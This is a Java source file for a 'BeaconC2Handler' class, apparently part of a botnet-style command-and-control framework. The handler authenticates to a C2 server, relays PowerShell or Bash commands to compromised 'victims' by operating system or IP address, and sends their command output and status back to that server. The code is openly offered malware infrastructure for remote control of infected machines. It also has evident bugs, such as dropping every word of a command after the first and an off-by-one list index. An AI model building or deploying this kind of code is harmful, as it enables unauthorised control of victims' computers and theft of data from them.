package Servers.Beacon;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;

import Servers.Duplexer;

public class BeaconC2Handler implements Runnable{
    // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
    private BeaconServer beaconServer;

    // Pointer to the C2 Server that the user interacts with the user
    private Duplexer C2Server;

    // Hashed Password for Authentication to the C2 Server
    private String passwordDigest;

    /**
     * This starts a thread that sends and receives messages with the C2 Server
     * 
     * This thread then interacts with the Long Range Beacon Server, the Long Range Beacon
     * Server then interacts with all of the clients (victims)
     * 
     * @param beaconServer The Long Range Beacon Server
     * @param C2ServerIPAddress The IP Address of the C2 Server
     * @throws IOException
     */
    protected BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.beaconServer = beaconServer;
        Socket socket = new Socket(C2ServerIPAddress, 1234);
        this.C2Server = new Duplexer(socket);
        this.passwordDigest = passwordDigest;
    }

    /**
     * Function meant to be used by the Long Range Beacon Server
     * to send data back to the C2 Server when it's requested
     * 
     * @param Data The Data to be sent back to the C2 Server
     */
    protected void sendDataToC2Server(String Data){
        C2Server.send(Data);
    }

    @Override
    public void run(){
        /**
         * Commands from the C2 Server are organized in a hierarchical structure
         * Command to be sent to Computer
         *      Either Windows or Linux
         *          All Computers, or specific computer
         * Request for Data from the Long Range Beacon
         *      Client Responses
         *          Either Windows or Linux
         *              All computers, or specific computer
         *      Client Status Updates
         *          All, Windows, Linux, or Specific Computer
         */

        // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
        // message to the Beacon Server for further distribution.
        Boolean authenticationSentinel = true;
        C2Server.send(passwordDigest);
        try{
            String message = C2Server.receive();
            if(!(message.equals("Authentication Successful"))){
                String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
                beaconServer.quit(reason);
                C2Server.close();
                authenticationSentinel = false;
            }
        }catch(IOException e){
            e.printStackTrace();
        }
        
        while(authenticationSentinel){
            try{
                String message = C2Server.receive();
                System.out.println(message);
                String[] tokens = message.split(" ");
                if(tokens[0].equals("quit")){
                    break;
                }
                if(tokens[0].equals("Command")){
                    // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address] [Powershell/Bash command to be run]"
                    if(tokens[2].equals("All")){
                        beaconServer.distributeCommands(tokens[1], tokens[3]);
                    } else {
                        beaconServer.distributeCommands(tokens[2], tokens[3]);
                    }
                }else if(tokens[0].equals("Request")){
                    String responseToRequest = "";
                    if(tokens[1].equals("ClientData")){
                        if(tokens[2].equals("Windows")){
                            if(tokens[3].equals("All")){
                                HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
                                for (String IP : windowsClientResponseList.keySet()){
                                    responseToRequest += IP + ": \n";
                                    for (int i = 1; i < windowsClientResponseList.get(IP).size()+1; i++){
                                        responseToRequest += i + ". " + windowsClientResponseList.get(IP).get(i);
                                    }
                                }
                            }else{
                                responseToRequest = beaconServer.getSingleClientResponses(tokens[3]).toString();
                            }
                        }else if(tokens[2].equals("Linux")){
                            if(tokens[3].equals("All")){
                                responseToRequest = beaconServer.getMultipleClientResponses("Linux").toString();
                            }
                            else{
                                responseToRequest = beaconServer.getSingleClientResponses(tokens[3]).toString();
                            }
                        }
                    }else if(tokens[1].equals("ClientStatus")){
                        responseToRequest = beaconServer.getClientStatus(tokens[2]).toString();
                    }
                    C2Server.send(responseToRequest);
                }
                
            } catch(IOException e){
                e.printStackTrace();
            }
        }
    }
}
